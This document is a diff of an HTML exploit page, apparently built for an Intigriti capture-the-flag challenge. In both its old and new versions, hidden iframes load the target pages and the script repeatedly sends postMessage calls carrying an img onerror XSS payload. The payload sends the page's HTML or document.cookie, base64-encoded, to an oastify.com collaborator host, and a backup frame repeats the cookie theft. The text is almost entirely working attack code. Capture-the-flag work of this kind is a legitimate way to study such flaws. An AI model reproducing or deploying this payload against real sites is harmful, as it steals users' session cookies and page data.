@@ -1,42 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head><title>Follow the Trail</title></head>
-<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;">
-    <h1>TRANSFERRING 1337COIN...</h1>
-    
-    <iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="1" height="1"></iframe>
-    
-    <iframe id="trigger" src="https://challenge-0126.intigriti.io/marketwatch.html" width="1" height="1"></iframe>
+<body>
+    <h1>"Following the trail of coins..."</h1>
+    <iframe id="target" src="http://localhost/dashboard.html" width="1" height="1" style="display:none"></iframe>
 
     <script>
-        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
-        
-        // The Payload: Breaks out of the title attribute.
-        // It tries to grab the flag from the banner OR the cookies.
-        const XSS = `"><img src=x onerror="fetch('${COLLAB}/?flag='+btoa(document.body.innerHTML))">`;
+        const collab = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
+        const targetFrame = document.getElementById('target');
 
-        window.onload = function() {
-            const checkoutFrame = document.getElementById('checkout').contentWindow;
+        targetFrame.onload = function() {
+            // The payload for the innerHTML sink found in your image
+            const xssPayload = `<img src=x onerror="fetch('${collab}/?flag='+btoa(document.cookie))">`;
 
-            // Step 1: Spam the transaction to checkout.html
-            let count = 0;
-            const spammer = setInterval(() => {
-                checkoutFrame.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        currency: '1337COIN',
-                        amount: 0.0001,
-                        toAddress: XSS 
-                    }
-                }, '*');
-                count++;
-                if (count > 20) clearInterval(spammer);
-            }, 500);
+            const message = {
+                type: 'updateContent',
+                widgetId: 'customReports',
+                content: xssPayload
+            };
 
-            // Step 2: Refresh the MarketWatch iframe to see the new "trail" (the XSS)
-            setTimeout(() => {
-                document.getElementById('trigger').src = "https://challenge-0126.intigriti.io/marketwatch.html";
-            }, 6000);
+            // Spam the internal origin
+            setInterval(() => {
+                targetFrame.contentWindow.postMessage(message, '*');
+            }, 200);
+        };
+
+        // If 'localhost' fails, try the challenge domain directly in a hidden frame
+        const backup = document.createElement('iframe');
+        backup.src = 'https://challenge-0126.intigriti.io/dashboard.html';
+        document.body.appendChild(backup);
+        backup.onload = () => {
+             backup.contentWindow.postMessage({
+                type: 'updateContent',
+                widgetId: 'customReports',
+                content: `<img src=x onerror="fetch('${collab}/?backup='+btoa(document.cookie))">`
+            }, '*');
         };
     </script>
 </body>
